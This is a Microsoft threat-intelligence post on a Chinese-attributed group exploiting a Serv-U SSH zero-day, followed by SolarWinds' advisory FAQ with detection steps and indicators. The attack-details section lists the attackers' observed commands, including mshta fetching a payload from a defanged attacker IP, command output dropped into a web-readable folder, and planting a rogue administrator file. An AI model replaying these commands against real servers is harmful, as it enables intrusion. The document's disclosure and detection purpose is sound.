# Microsoft discovers threat actor targeting SolarWinds Serv-U software with 0-day exploit

* By
  [Microsoft Threat Intelligence](https://www.microsoft.com/en-us/security/blog/author/microsoft-security-threat-intelligence/)

July 13, 2021

* [Microsoft Defender XDR](https://www.microsoft.com/en-us/security/blog/products/microsoft-defender-xdr/)
* [Threat actors](https://www.microsoft.com/en-us/security/blog/threat-intelligence/threat-actors/)

Microsoft has detected a 0-day remote code execution exploit being used to attack SolarWinds Serv-U FTP software in limited and targeted attacks. The Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to DEV-0322, a group operating out of China, based on observed victimology, tactics, and procedures.

The vulnerability being exploited is CVE-2021-35211, which was [recently patched by SolarWinds](https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35211). The vulnerability, which Microsoft reported to SolarWinds, exists in Serv-U’s implementation of the Secure Shell (SSH) protocol. If Serv-U’s SSH is exposed to the internet, successful exploitation would give attackers ability to remotely run arbitrary code with privileges, allowing them to perform actions like install and run malicious payloads, or view and change data. We strongly urge all customers to update their instances of Serv-U to the latest available version.

[Microsoft 365 Defender](https://www.microsoft.com/en-us/microsoft-365/security/microsoft-365-defender) has been protecting customers against malicious activity resulting from successful exploitation, even before the security patch was available. Microsoft Defender Antivirus blocks malicious files, behavior, and payloads. Our endpoint protection solution detects and raises alerts for the attacker’s follow-on malicious actions. [Microsoft Threat Experts](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/microsoft-threat-experts?view=o365-worldwide) customers who were affected were notified of attacker activity and were aided in responding to the attack.

Microsoft would like to thank SolarWinds for their cooperation and quick response to the vulnerability we reported.

## Who is DEV-0322?

MSTIC tracks and investigates a range of malicious cyber activities and operations. During the tracking and investigation phases prior to when MSTIC reaches high confidence about the origin or identity of the actor behind an operation, we refer to the unidentified threat actor as a “development group” or “DEV group” and assigns each DEV group a unique number (DEV-####) for tracking purposes.

MSTIC has observed DEV-0322 targeting entities in the U.S. Defense Industrial Base Sector and software companies. This activity group is based in China and has been observed using commercial VPN solutions and compromised consumer routers in their attacker infrastructure.

## Attack details

MSTIC discovered the 0-day attack behavior in Microsoft 365 Defender telemetry during a routine investigation. An anomalous malicious process was found to be spawning from the Serv-U process, suggesting that it had been compromised. Some examples of the malicious processes spawned from *Serv-U.exe* include:

* *C:\Windows\System32\mshta.exe http://144[.]34[.]179[.]162/a* (defanged)
* *cmd.exe /c whoami > “./Client/Common/redacted.txt”*
* *cmd.exe /c dir > “.\Client\Common\redacted.txt”*
* *cmd.exe /c “”C:\Windows\Temp\Serv-U.bat””*
* *powershell.exe C:\Windows\Temp\Serv-U.bat*
* *cmd.exe /c type \\redacted\redacted.Archive > “C:\ProgramData\RhinoSoft\Serv-U\Users\Global Users\redacted.Archive”*

We observed DEV-0322 piping the output of their *cmd.exe* commands to files in the Serv-U *\Client\Common\* folder, which is accessible from the internet by default, so that the attackers could retrieve the results of the commands. The actor was also found adding a new [global user](https://documentation.solarwinds.com/en/success_center/servu/content/servu-global-users-global-users.htm) to Serv-U, effectively adding themselves as a Serv-U administrator, by manually creating a crafted *.Archive* file in the *Global Users* directory. Serv-U user information is stored in these *.Archive* files.

Due to the way DEV-0322 had written their code, when the exploit successfully compromises the Serv-U process, an exception is generated and logged to a Serv-U log file, *DebugSocketLog.txt*. The process could also crash after a malicious command was run.

By reviewing telemetry, we identified features of the exploit, but not a root-cause vulnerability. MSTIC worked with the Microsoft Offensive Security Research team, who performed vulnerability research on the Serv-U binary and identified the vulnerability through black box analysis. Once a root cause was found, we reported the vulnerability to SolarWinds, who responded quickly to understand the issue and build a patch.

To protect customers before a patch was available, the Microsoft 365 Defender team quickly released detections that catch known malicious behaviours, ensuring customers are protected from and alerted to malicious activity related to the 0-day. Affected customers enrolled to Microsoft Threat Experts, our managed threat hunting service, received a [targeted attack notification](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-threat-experts?view=o365-worldwide#microsoft-threat-experts---targeted-attack-notification), which contained details of the compromise. The Microsoft Threat Experts and MSTIC teams worked closely with these customers to respond to the attack and ensure their environments were secure.

## Detection guidance

Customers should review the Serv-U *DebugSocketLog.txt* log file for exception messages like the line below. A *C0000005; CSUSSHSocket::ProcessReceive* exception can indicate that an exploit was attempted, but it can also appear for unrelated reasons. Either way, if the exception is found, customers should carefully review their logs for behaviors and indicators of compromise discussed here.

`EXCEPTION: C0000005; CSUSSHSocket::ProcessReceive(); Type: 30; puchPayLoad = 0x03e909f6; nPacketLength = 76; nBytesReceived = 80; nBytesUncompressed = 156; uchPaddingLength = 5`

Additional signs of potential compromise include:

* Recent creation of *.txt* files in the Client\Common\ directory for the Serv-U installation. These files may contain output from Windows commands like whoami and dir.
* *Serv-U.exe* spawning child processes that are not part of normal operations. These could change depending on the customer environment, but we suggest searching for:
  + *mshta.exe*
  + *powershell.exe*
  + cmd.exe (or conhost.exe then spawning cmd.exe) with any of the following in the command line:
    - *whoami*
    - *dir*
    - *./Client/Common*
    - *.\Client\Common*
    - *type [a file path] > “C:\ProgramData\RhinoSoft\Serv-U\Users\Global Users\[file name].Archive”*
  + Any process with any of the following in the command line:
    - *C:\Windows\Temp\*
* The addition of any unrecognized [global users](https://documentation.solarwinds.com/en/success_center/servu/content/servu-global-users-global-users.htm) to Serv-U. This can be checked in the Users tab of the Serv-U Management Console, as shown below. It can also be checked by looking for recently created files in *C:\ProgramData\RhinoSoft\Serv-U\Users\Global Users*, which appears to store the Global users information.

### Security Advisory Summary

**UPDATE July 15, 20201:** **You can** [Subscribe to this RSS Feed](https://www.solarwinds.com/shared-content/rss-feed/solarwinds-cve-rss-feed) **to be notified when we update this page (note: you will need to cut and paste the "Subscribe to this RSS feed" URL into an RSS Feed Reader, e.g., Outlook's RSS Subscriptions, to monitor updates).**

**UPDATE July 13, 20201:** **We've provided additional indicators of compromise (IOCs) below. You can also find additional details on the threat actor and their findings in a** [blog post](https://www.microsoft.com/en-us/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/) **from Microsoft.**

**UPDATE July 10, 2021:** **NOTE: This security vulnerability** **only** **affects Serv-U Managed File Transfer and Serv-U Secure FTP and** **does not affect** **any other SolarWinds or N-able (formerly SolarWinds MSP) products.**

SolarWinds was recently notified by Microsoft of a security vulnerability related to [Serv-U Managed File Transfer Server](https://www.solarwinds.com/serv-u-managed-file-transfer-server) and [Serv-U Secured FTP](https://www.solarwinds.com/ftp-server-software) and have developed a hotfix to resolve this vulnerability. While Microsoft’s research indicates this vulnerability exploit involves a limited, targeted set of customers and a single threat actor, our joint teams have mobilized to address it quickly.

The vulnerability exists in the latest Serv-U version 15.2.3 HF1 released May 5, 2021, and all prior versions. A threat actor who successfully exploited this vulnerability could run arbitrary code with privileges. An attacker could then install programs; view, change, or delete data; or run programs on the affected system.

Serv-U version 15.2.3 hotfix (HF) 2 has been released. Please see the **Security Updates** table below for the applicable update for your system. We recommend you install these updates immediately. If you are unable to install these updates, see the **FAQ** in this Security Advisory for information on how to help protect your system from this vulnerability.

Additional details of the vulnerability will be published after giving customers sufficient time to upgrade for the protection of their environments.

### **FAQ**

#### **What happened?**

Microsoft reported to SolarWinds that they had discovered a remote code execution (RCE) vulnerability in the SolarWinds Serv-U product. Microsoft provided a proof of concept of the exploit. If exploited, a threat actor may be able to gain privileged access to the threat actor on the machine hosting Serv-U.

To the best of our understanding, no other SolarWinds products have been affected by this vulnerability.

#### **Have SolarWinds customers been affected?**

Microsoft has provided evidence of limited, targeted customer impact, though SolarWinds does not currently have an estimate of how many customers may be directly affected by the vulnerability. SolarWinds is unaware of the identity of the potentially affected customers.

#### **Have N-able customers been affected?**

No, N-able customer who do not use Serv-U are not affected by this vulnerability.

*Updated July 13, 2021*

#### **What products are affected?**

**Only** SolarWinds Serv-U Managed File Transfer and Serv-U Secure FTP **for Windows** are affected by this vulnerability. Please note the Serv-U Gateway is a component of these two products and is not a separate product.

The Linux versions of these products **are not vulnerable** to a RCE exploit of this security vulnerability. The Linux version of the Serv-U product crashes when the exploit is attempted by a threat actor.

*Updated July 15, 2021*

*Updated July 10, 2021*

#### **What actions should I take?**

If you are an **active maintenance SolarWinds customer of the Serv-U product**, SolarWinds asks you to log into your [Customer Portal](https://customerportal.solarwinds.com/) to access your updates. This update is expected to take only a few minutes to implement.

If you are **not on active maintenance and currently using a Serv-U product**, our Customer Success team is available to help you with your questions. Please open a [customer service ticket](https://customerportal.solarwinds.com/support/submit-a-ticket?sid=satsn) with the subject "Serv-U Assistance" and our team will assist you (no login required).

*Updated July 13, 2021*

#### **How can I tell if my environment has been compromised?**

The following steps are steps you can take to determine if your environment has been compromised:

**1. Is SSH enabled for your Serv-U installation?** If SSH is not enabled in the environment, the vulnerability does not exist.

**2. Is your environment throwing exceptions?** This attack is a Return Oriented Programming (ROP) attack. When exploited, the vulnerability causes the Serv-U product to throw an exception and then intercepts the exception handling code to run commands. Please note, several reasons exist for exceptions to be thrown, so an exception itself is not necessarily an indicator of attack.

Please collect the **DebugSocketlog.txt** log file, which can be found in the following locations:

C:\ProgramData\RhinoSoft\Serv-U\DebugSocketlog.txt

C:\ProgramFiles\RhinoSoft\Serv-U\DebugSocketlog.txt

In the log file **DebugSocketlog.txt** you may see an exception, such as:

07] Tue 01Jun21 02:42:58 - EXCEPTION: C0000005; CSUSSHSocket::ProcessReceive(); Type: 30; puchPayLoad = 0x041ec066; nPacketLength = 76; nBytesReceived = 80;

nBytesUncompressed = 156; uchPaddingLength = 5

Exceptions may be thrown for other reasons so **please collect the logs** to assist with determining your situation.

**3. Are you seeing potentially suspicious connections via SSH?** Look for connections via SSH from the following IP addresses, which have been reported as a potential indicator of attack by the threat actor:

**98[.]176[.]196[.]89**

**68[.]235[.]178[.]32**

**208[.]113[.]35[.]58**

**144[.]34[.]179[.]162**

**97[.]77[.]97[.]58**

Other indicators:

**hxxp://144[.]34[.]179[.]162/a**

**C:\Windows\Temp\Serv-u.bat**

**C:\Windows\Temp\test\current.dmp**

**4. Are you seeing potentially suspicious activity by Serv-U?** Review your monitoring tools and/or EDR platforms for Serv-U.exe spawning anomalous processes, such as:

* *mshta.exe*
* *powershell.exe*
* *cmd.exe* (or *conhost.exe* then spawning *cmd.exe*) with any of the following in the command line:

+ *whoami*
+ *dir*
+ *./Client/Common*
+ *.\Client\Common*
+ *type [a file path] > "C:\ProgramData\RhinoSoft\Serv-U\Users\Global Users\[file name].Archive"*

* Any process with the following in the command line:

+ *C:\Windows\Temp\*

* The addition of any unrecognized Global users to Serv-U. This can be checked in the users tab of the Serv-U Management Console, as shown below. It can also be checked by looking for recently created files in *C:\ProgramData\RhinoSoft\Serv-U\Users\Global Users*, which appears to store the Global users information.

If you observe this activity, investigate these processes further, and any traffic originating from the Serv-U box. Please contact SolarWinds Customer Support with this information, and we will escalate for investigation.

#### **Is this vulnerability related to the SUNBURST cyberattack?**

No. It’s important to note this new vulnerability is completely unrelated to the SUNBURST supply chain attack. Software vulnerabilities are quite common, range in severity levels, and are routinely resolved by software vendors as part of their ongoing maintenance release schedules.

#### **What kind of vulnerability is this?**

Based on our investigations, this is a remote code execution (RCE) exploit.

#### **What versions of Serv-U are affected?**

Based on our investigations, this RCE exploit affects all versions of Serv-U, prior to version 15.2.3 HF2, which has been built to address this vulnerability, and to help protect your environment.

*Updated July 13, 2021*

#### **Where can I get additional information?**

We understand the desire for more information on this issue, and we’ll provide more information here as it’s available.

In the meantime, our Customer Success team is available to you. Please open a [customer service ticket](https://customerportal.solarwinds.com/support/submit-a-ticket?sid=satsn) with the subject "Serv-U Assistance" and our team will assist you (no login required).
